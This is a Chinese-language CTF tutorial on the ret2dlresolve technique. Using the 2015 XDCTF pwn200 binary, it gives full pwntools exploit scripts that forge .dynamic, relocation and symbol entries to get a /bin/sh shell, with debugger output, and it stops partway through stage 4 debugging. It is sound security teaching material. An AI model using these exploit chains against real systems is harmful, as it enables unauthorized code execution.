# ret2dlresolve

在学习这个 ROP 利用技巧前，需要首先理解动态链接的基本过程以及 ELF 文件中动态链接相关的结构。读者可以参考 executable 部分  ELF 对应的介绍。这里只给出相应的利用方式。

## 原理

在 Linux 中，程序使用 `_dl_runtime_resolve(link_map_obj, reloc_offset)` 来对动态链接的函数进行重定位。那么如果我们可以控制相应的参数及其对应地址的内容是不是就可以控制解析的函数了呢？答案是肯定的。这也是 ret2dlresolve 攻击的核心所在。

具体的，动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态字符串表都是从目标文件中的动态节 `.dynamic` 索引得到的。所以如果我们能够修改其中的某些内容使得最后动态链接器解析的符号是我们想要解析的符号，那么攻击就达成了。

### 思路1 - 直接控制重定位表项的相关内容

由于动态链接器最后在解析符号的地址时，是依据符号的名字进行解析的。因此，一个很自然的想法是直接修改动态字符串表 `.dynstr`，比如把某个函数在字符串表中对应的字符串修改为目标函数对应的字符串。但是，动态字符串表和代码映射在一起，是只读的。此外，类似地，我们可以发现动态符号表、重定位表项都是只读的。

但是，假如我们可以控制程序执行流，那我们就可以伪造合适的重定位偏移，从而达到调用目标函数的目的。然而，这种方法比较麻烦，因为我们不仅需要伪造重定位表项，符号信息和字符串信息，而且我们还需要确保动态链接器在解析的过程中不会出错。

### 思路2 - 间接控制重定位表项的相关内容

既然动态链接器会从 `.dynamic` 节中索引到各个目标节，那如果我们可以修改动态节中的内容，那自然就很容易控制待解析符号对应的字符串，从而达到执行目标函数的目的。

### 思路3 - 伪造 link_map

由于动态连接器在解析符号地址时，主要依赖于 link_map 来查询相关的地址。因此，如果我们可以成功伪造 link_map，也就可以控制程序执行目标函数。

下面我们以 2015-XDCTF-pwn200 来介绍 32 位和 64 位下如何使用 ret2dlresolve 技巧。

## 32 位例子

### NO RELRO

首先，我们可以按照下面的方式来编译对应的文件。

```shell
❯ gcc -fno-stack-protector -m32 -z norelro -no-pie main.c -o main_norelro_32
❯ checksec main_no_relro_32
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

在这种情况下，修改 `.dynamic` 会简单些。因为我们只需要修改 `.dynamic` 节中的字符串表的地址为伪造的字符串表的地址，并且相应的位置为目标字符串基本就行了。具体思路如下

1. 修改 .dynamic 节中字符串表的地址为伪造的地址
2. 在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。
3. 在特定的位置读取 /bin/sh 字符串。
4. 调用 read 函数的 plt 的第二条指令，触发 `_dl_runtime_resolve` 进行函数解析，从而执行 system 函数。

代码如下

```python
from pwn import *
# context.log_level="debug"
context.terminal = ["tmux","splitw","-h"]
context.arch="i386"
p = process("./main_no_relro_32")
rop = ROP("./main_no_relro_32")
elf = ELF("./main_no_relro_32")

p.recvuntil('Welcome to XDCTF2015~!\n')

offset = 112
rop.raw(offset*'a')
rop.read(0,0x08049804+4,4) # modify .dynstr pointer in .dynamic section to a specific location
dynstr = elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace("read","system")
rop.read(0,0x080498E0,len((dynstr))) # construct a fake dynstr section
rop.read(0,0x080498E0+0x100,len("/bin/sh\x00")) # read /bin/sh\x00
rop.raw(0x08048376) # the second instruction of read@plt 
rop.raw(0xdeadbeef)
rop.raw(0x080498E0+0x100)
# print(rop.dump())
assert(len(rop.chain())<=256)
rop.raw("a"*(256-len(rop.chain())))
p.send(rop.chain())
p.send(p32(0x080498E0))
p.send(dynstr)
p.send("/bin/sh\x00")
p.interactive()
```

运行效果如下

```python
❯ python exp-no-relro.py
[+] Starting local process './main_no_relro_32': pid 35093
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded 10 cached gadgets for './main_no_relro_32'
[*] Switching to interactive mode
$ ls
exp-no-relro.py  main_no_relro_32
```

### Partial RELRO

首先我们可以编译源文件 main.c 得到二进制文件，这里取消了 Canary 保护。

```shell
❯ gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie ../../main.c -o main_partial_relro_32
❯ checksec main_partial_relro_32
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/parti
al-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

在这种情况下，ELF 文件中的 .dynamic 节将会变成只读的，这时我们可以通过伪造重定位表项的方式来调用目标函数。

在下面的讲解过程中，本文会按照以下两种不同的方式来使用该技巧。

1.  通过手工伪造的方式使用该技巧，从而获取 shell。这种方式虽然比较麻烦，但是可以仔细理解 ret2dlresolve 的原理。
2.  利用工具来实现攻击，从而获取 shell。这种方式比较简单，但我们还是应该充分理解背后的原理，不能只是会使用工具。

#### 手工伪造

这题我们不考虑有 libc 的情况。通过分析，我们可以发现程序有一个很明显的栈溢出漏洞，缓冲区到返回地址间的偏移为 112。

```asm
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[+] Saved as '$_gef0'
gef➤  r
Starting program: /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
Welcome to XDCTF2015~!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xc9
$ebx   : 0x62616162 ("baab"?)
$ecx   : 0xffffcddc  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$edx   : 0x100
$esp   : 0xffffce50  →  "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
$ebp   : 0x62616163 ("caab"?)
$esi   : 0xf7fb0000  →  0x001d7d6c
$edi   : 0xffffcec0  →  0x00000001
$eip   : 0x62616164 ("daab"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────────────── stack ────
0xffffce50│+0x0000: "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"	 ← $esp
0xffffce54│+0x0004: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
0xffffce58│+0x0008: "gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]"
0xffffce5c│+0x000c: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
0xffffce60│+0x0010: "iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]"
0xffffce64│+0x0014: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
0xffffce68│+0x0018: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
0xffffce6c│+0x001c: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
─────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x62616164
─────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "main_partial_re", stopped 0x62616164 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────
0x62616164 in ?? ()
gef➤  pattern search 0x62616164
[+] Searching '0x62616164'
[+] Found at offset 112 (little-endian search) likely
```

在下面的每一个阶段中，我们会一步步地深入理解如何构造 payload。

##### stage 1

在这一阶段，我们的目的比较简单，就是控制程序直接执行 write 函数。在栈溢出的情况下，我们其实可以直接控制返回地址来控制程序直接执行 write 函数。但是这里我们采用一个相对复杂点的办法，即先使用栈迁移，将栈迁移到 bss 段，然后再来控制 write 函数。因此，这一阶段主要包括两步

1. 将栈迁移到 bss 段。
2. 通过 write 函数的 plt 表项来执行 write 函数，输出相应字符串。

这里使用了 pwntools 中的 ROP 模块。具体代码如下

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write "/bin/sh"
rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"
rop.write(1, base_stage + 80, len(sh))
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))
r.sendline(rop.chain())

r.interactive()
```

结果如下

```shell
❯ python stage1.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 25112
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

##### stage 2

在这一阶段，我们将会进一步利用 `_dl_runtime_resolve` 相关的知识来控制程序执行 write 函数。

1. 将栈迁移到 bss 段。
2. 控制程序直接执行 plt0 中的相关指令，即 push linkmap 以及跳转到 `_dl_runtime_resolve` 函数。这时，我们还需要提供  write 重定位项在 got 表中的偏移。这里，我们可以直接使用 write plt 中提供的偏移，即 0x080483C6 处所给出的 0x20。其实，我们也可以跳转到 0x080483C6 地址处，利用原有的指令来提供 write 函数的偏移，并跳转到 plt0。

```
.plt:08048370 ; ===========================================================================
.plt:08048370
.plt:08048370 ; Segment type: Pure code
.plt:08048370 ; Segment permissions: Read/Execute
.plt:08048370 _plt            segment para public 'CODE' use32
.plt:08048370                 assume cs:_plt
.plt:08048370                 ;org 8048370h
.plt:08048370                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.plt:08048370
.plt:08048370 ; =============== S U B R O U T I N E =======================================
.plt:08048370
.plt:08048370
.plt:08048370 sub_8048370     proc near               ; CODE XREF: .plt:0804838B↓j
.plt:08048370                                         ; .plt:0804839B↓j ...
.plt:08048370 ; __unwind {
.plt:08048370                 push    ds:dword_804A004
.plt:08048376                 jmp     ds:dword_804A008
.plt:08048376 sub_8048370     endp
.plt:08048376
...
.plt:080483C0 ; =============== S U B R O U T I N E =======================================
.plt:080483C0
.plt:080483C0 ; Attributes: thunk
.plt:080483C0
.plt:080483C0 ; ssize_t write(int fd, const void *buf, size_t n)
.plt:080483C0 _write          proc near               ; CODE XREF: main+8A↓p
.plt:080483C0
.plt:080483C0 fd              = dword ptr  4
.plt:080483C0 buf             = dword ptr  8
.plt:080483C0 n               = dword ptr  0Ch
.plt:080483C0
.plt:080483C0                 jmp     ds:off_804A01C
.plt:080483C0 _write          endp
.plt:080483C0
.plt:080483C6 ; ---------------------------------------------------------------------------
.plt:080483C6                 push    20h ; ' '
.plt:080483CB                 jmp     sub_8048370
```

具体代码如下

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write "/bin/sh"
rop = ROP('./main_partial_relro_32')
plt0 = elf.get_section_by_name('.plt').header.sh_addr
jmprel_data = elf.get_section_by_name('.rel.plt').data()
writegot = elf.got["write"]
write_reloc_offset = jmprel_data.find(p32(writegot,endian="little"))
print(write_reloc_offset)
rop.raw(plt0)
rop.raw(write_reloc_offset)
# fake ret addr of write
rop.raw('bbbb')
# fake write args, write(1, base_stage+80, sh)
rop.raw(1)  
rop.raw(base_stage + 80)
sh = "/bin/sh"
rop.raw(len(sh))
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

效果如下，仍然输出了 sh 对应的字符串。

```shell
❯ python stage2.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 25131
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
32
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

##### stage 3

这一次，我们同样控制  `_dl_runtime_resolve` 函数中的 reloc_offset 参数，不过这次控制其指向我们伪造的 write 重定位项。

鉴于 pwntools 本身并不支持对重定位表项的信息的获取。这里我们手动看一下

```shell
❯ readelf -r main_partial_relro_32

Relocation section '.rel.dyn' at offset 0x30c contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff4  00000306 R_386_GLOB_DAT    00000000   __gmon_start__
08049ff8  00000706 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0
08049ffc  00000806 R_386_GLOB_DAT    00000000   stdout@GLIBC_2.0

Relocation section '.rel.plt' at offset 0x324 contains 5 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
```

可以看出 write 的重定表项的 r_offset=0x0804a01c，r_info=0x00000607。具体代码如下

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write "/bin/sh"
rop = ROP('./main_partial_relro_32')
plt0 = elf.get_section_by_name('.plt').header.sh_addr
got0 = elf.get_section_by_name('.got').header.sh_addr

rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
# make base_stage+24 ---> fake reloc
write_reloc_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = 0x607

rop.raw(plt0)
rop.raw(write_reloc_offset)
# fake ret addr of write
rop.raw('bbbb')
# fake write args, write(1, base_stage+80, sh)
rop.raw(1)  
rop.raw(base_stage + 80)
sh = "/bin/sh"
rop.raw(len(sh))
# construct fake write relocation entry
rop.raw(write_got)
rop.raw(r_info)
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

这次我们在 base_stage+24 处伪造了一个 write 的重定位项，仍然输出了对应的字符串。

```shell
❯ python stage3.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 24506
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
```

##### stage 4

在 stage3 中，我们控制了重定位表项，但是伪造的重定位表项的内容仍然与 write 函数原来的重定位表项一致。

在这个阶段中，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据 write 的重定位表项的 r_info=0x607 可以知道，write 对应的符号在符号表的下标为 0x607>>8=0x6。因此，我们知道 write 对应的符号地址为 0x0804822c。

```shell
❯ readelf -x .dynsym main_partial_relro_32

Hex dump of section '.dynsym':
  0x080481cc 00000000 00000000 00000000 00000000 ................
  0x080481dc 33000000 00000000 00000000 12000000 3...............
  0x080481ec 27000000 00000000 00000000 12000000 '...............
  0x080481fc 5c000000 00000000 00000000 20000000 \........... ...
  0x0804820c 20000000 00000000 00000000 12000000  ...............
  0x0804821c 3a000000 00000000 00000000 12000000 :...............
  0x0804822c 4c000000 00000000 00000000 12000000 L...............
  0x0804823c 1a000000 00000000 00000000 11000000 ................
  0x0804824c 2c000000 00000000 00000000 11000000 ,...............
  0x0804825c 0b000000 6c860408 04000000 11001000 ....l...........
```

这里给出的其实是小端模式，因此我们需要手工转换。此外，每个符号占用的大小为 16 个字节。

```python
from pwn import *
elf = ELF('./main_partial_relro_32')
r = process('./main_partial_relro_32')
rop = ROP('./main_partial_relro_32')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment, set esp = base_stage
stack_size = 0x800 # new stack size is 0x800
base_stage = bss_addr + stack_size
rop.raw('a' * offset) # padding
rop.read(0, base_stage, 100) # read 100 byte to base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())


rop = ROP('./main_partial_relro_32')
sh = "/bin/sh"

plt0 = elf.get_section_by_name('.plt').header.sh_addr
rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# make a fake write symbol at base_stage + 32 + align
fake_sym_addr = base_stage + 32
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf
                )  # since the size of Elf32_Symbol is 0x10
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10  # calculate the dynsym index of write
fake_write_sym = flat([0x4c, 0, 0, 0x12])

# make fake write relocation at base_stage+24
index_offset = base_stage + 24 - rel_plt
write_got = elf.got['write']
r_info = (index_dynsym << 8) | 0x7 # calculate the r_info according to the index of write
fake_write_reloc = flat([write_got, r_info])

# construct rop chain
rop.raw(plt0)
rop.raw(index_offset)
rop.raw('bbbb') # fake ret addr of write
rop.raw(1)
rop.raw(base_stage + 80)
rop.raw(len(sh))
rop.raw(fake_write_reloc)  # fake write reloc
rop.raw('a' * align)  # padding
rop.raw(fake_write_sym)  # fake write symbol
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
```

直接执行后发现并不行

```shell
❯ python stage4.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27370
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```

发现程序已经崩溃了，通过 coredump，可以发现程序在 `ld-linux.so.2` 中崩了。

```assembly
 ► 0xf7f77fed    mov    ebx, dword ptr [edx + 4]
   0xf7f77ff0    test   ebx, ebx
   0xf7f77ff2    mov    ebx, 0
   0xf7f77ff7    cmove  edx, ebx
   0xf7f77ffa    mov    esi, dword ptr gs:[0xc]
   0xf7f78001    test   esi, esi
   0xf7f78003    mov    ebx, 1
   0xf7f78008    jne    0xf7f78078 <0xf7f78078>
    ↓
   0xf7f78078    mov    dword ptr gs:[0x1c], 1
   0xf7f78083    mov    ebx, 5
   0xf7f78088    jmp    0xf7f7800a <0xf7f7800a>
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp  0x804a7dc ◂— 0x0
... ↓
02:0008│      0x804a7e4 —▸ 0xf7f90000 ◂— 0x26f34
03:000c│      0x804a7e8 —▸ 0x804826c ◂— add    byte ptr [ecx + ebp*2 + 0x62], ch
04:0010│      0x804a7ec ◂— 0x0
... ↓
07:001c│      0x804a7f8 —▸ 0x804a84c ◂— 0x4c /* 'L' */
─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
 ► f 0 f7f77fed
   f 1        0
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x804a000 r-xp     2000 0      ./main_partial_relro_32
 0x8049000  0x804b000 rw-p     2000 0      [stack]
 0x804a000  0x804b000 rw-p     1000 1000   ./main_partial_relro_32
0xf7d6b000 0xf7f40000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc.so.6
0xf7f40000 0xf7f41000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc.so.6
0xf7f41000 0xf7f43000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc.so.6
0xf7f43000 0xf7f47000 rw-p     4000 1d7000 /lib/i386-linux-gnu/libc.so.6
0xf7f67000 0xf7f69000 r-xp     2000 0      [vdso]
0xf7f69000 0xf7f90000 r-xp    27000 0      [linker]
0xf7f69000 0xf7f90000 r-xp    27000 0      /lib/ld-linux.so.2
0xf7f90000 0xf7f91000 rw-p     1000 26000  [linker]
0xf7f90000 0xf7f91000 rw-p     1000 26000  /lib/ld-linux.so.2
```

通过逆向分析 ld-linux.so.2 

```c
  if ( v9 )
  {
    v10 = (char *)a1[92] + 16 * (*(_WORD *)(*((_DWORD *)v9 + 1) + 2 * v4) & 0x7FFF);
    if ( !*((_DWORD *)v10 + 1) )
      v10 = 0;
  }
```

以及源码可以知道程序是在访问 version 的 hash 时出错。

```c
        if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
        {
            const ElfW(Half) *vernum =
                (const void *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);
            ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc->r_info)] & 0x7fff;
            version = &l->l_versions[ndx];
            if (version->hash == 0)
                version = NULL;
        }
```

进一步分析可以知道，因为我们伪造了 write 函数的重定位表项，其中 reloc->r_info 被设置成了比较大的值（由于 index_dynsym 离符号表比较远）。这时候，ndx 的值并不可预期，进而 version 的值也不可预期，因此可能出现不可预期的情况。

通过分析 .dynmic 节，我们可以发现 vernum 的地址为 0x80482d8。

```
❯ readelf -d main_partial_relro_32

Dynamic section at offset 0xf0c contains 24 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000c (INIT)                       0x804834c
 0x0000000d (FINI)                       0x8048654
 0x00000019 (INIT_ARRAY)                 0x8049f04
 0x0000001b (INIT_ARRAYSZ)               4 (bytes)
 0x0000001a (FINI_ARRAY)                 0x8049f08
 0x0000001c (FINI_ARRAYSZ)               4 (bytes)
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x804826c
 0x00000006 (SYMTAB)                     0x80481cc
 0x0000000a (STRSZ)                      107 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x804a000
 0x00000002 (PLTRELSZ)                   40 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x8048324
 0x00000011 (REL)                        0x804830c
 0x00000012 (RELSZ)                      24 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x80482ec
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x80482d8
 0x00000000 (NULL)                       0x0
```

在 ida 中，我们也可以看到相关的信息

```assembly
LOAD:080482D8 ; ELF GNU Symbol Version Table
LOAD:080482D8                 dw 0
LOAD:080482DA                 dw 2                    ; setbuf@@GLIBC_2.0
LOAD:080482DC                 dw 2                    ; read@@GLIBC_2.0
LOAD:080482DE                 dw 0                    ; local  symbol: __gmon_start__
LOAD:080482E0                 dw 2                    ; strlen@@GLIBC_2.0
LOAD:080482E2                 dw 2                    ; __libc_start_main@@GLIBC_2.0
LOAD:080482E4                 dw 2                    ; write@@GLIBC_2.0
LOAD:080482E6                 dw 2                    ; stdin@@GLIBC_2.0
LOAD:080482E8                 dw 2                    ; stdout@@GLIBC_2.0
LOAD:080482EA                 dw 1                    ; global symbol: _IO_stdin_used
```

那我们可以再次运行看一下伪造后 ndx 具体的值

```shell
❯ python stage4.py
[*] '/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './main_partial_relro_32': pid 27649
[*] Loaded 10 cached gadgets for './main_partial_relro_32'
ndx_addr: 0x80487a8
```

可以发现，ndx_落入了 `.eh_frame` 节中。

```assembly
.eh_frame:080487A8                 dw 442Ch
```

进一步地，ndx 的值为 0x442C。显然不知道会索引到哪里去。

```c
        if (l->l_info[VERSYMIDX(DT_VERSYM)] != NULL)
        {
            const ElfW(Half) *vernum =
                (const void *)D_PTR(l, l_info[VERSYMIDX(DT_VERSYM)]);
            ElfW(Half) ndx = vernum[ELFW(R_SYM)(reloc->r_info)] & 0x7fff;
            version = &l->l_versions[ndx];
            if (version->hash == 0)
                version = NULL;
        }
```

通过动态调试，我们可以发现 l_versions 的起始地址，并且其中一共有 3 个元素。

```assembly
pwndbg> print *((struct link_map *)0xf7f0d940)
$4 = {
  l_addr = 0, 
  l_name = 0xf7f0dc2c "", 
  l_ld = 0x8049f0c, 
  l_next = 0xf7f0dc30, 
  l_prev = 0x0, 
  l_real = 0xf7f0d940, 
  l_ns = 0, 
  l_libname = 0xf7f0dc20, 
  l_info = {0x0, 0x8049f0c, 0x8049f7c, 0x8049f74, 0x0, 0x8049f4c, 0x8049f54, 0x0, 0x0, 0x0, 0x8049f5c, 0x8049f64, 0x8049f14, 0x8049f1c, 0x0, 0x0, 0x0, 0x8049f94, 0x8049f9c, 0x8049fa4, 0x8049f84, 0x8049f6c, 0x0, 0x8049f8c, 0x0, 0x8049f24, 0x8049f34, 0x8049f2c, 0x8049f3c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fb4, 0x8049fac, 0x0 <repeats 13 times>, 0x8049fbc, 0x0 <repeats 25 times>, 0x8049f44}, 
  l_phdr = 0x8048034, 
  l_entry = 134513632, 
  l_phnum = 9, 
  l_ldnum = 0, 
  l_searchlist = {
    r_list = 0xf7edf3e0, 
    r_nlist = 3
  }, 
  l_symbolic_searchlist = {
    r_list = 0xf7f0dc1c, 
    r_nlist = 0
  }, 
  l_loader = 0x0, 
  l_versions = 0xf7edf3f0, 
  l_nversions = 3, 
```

对应的分别为 

```assembly
pwndbg> print *((struct r_found_version[3] *)0xf7edf3f0)
$13 = {{
    name = 0x0, 
    hash = 0, 
    hidden = 0, 
    filename = 0x0
  }, {
    name = 0x0, 
    hash = 0, 
    hidden = 0, 
    filename = 0x0
  }, {
    name = 0x80482be "GLIBC_2.0", 
    hash = 225011984, 
    hidden = 0, 
    filename = 0x804826d "libc.so.6"
  }}

```

此时，计算得到的 version 地址为 0xf7f236b0，显然不在映射的内存区域。

```assembly
pwndbg> print /x 0xf7edf3f0+0x442C*16
$16 = 0xf7f236b0
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 0x8048000  0x8049000 r-xp     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
 0x8049000  0x804a000 r--p     1000 0      /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
 0x804a000  0x804b000 rw-p     1000 1000   /mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/partial-relro/main_partial_relro_32
0xf7ce8000 0xf7ebd000 r-xp   1d5000 0      /lib/i386-linux-gnu/libc-2.27.so
0xf7ebd000 0xf7ebe000 ---p     1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
0xf7ebe000 0xf7ec0000 r--p     2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so
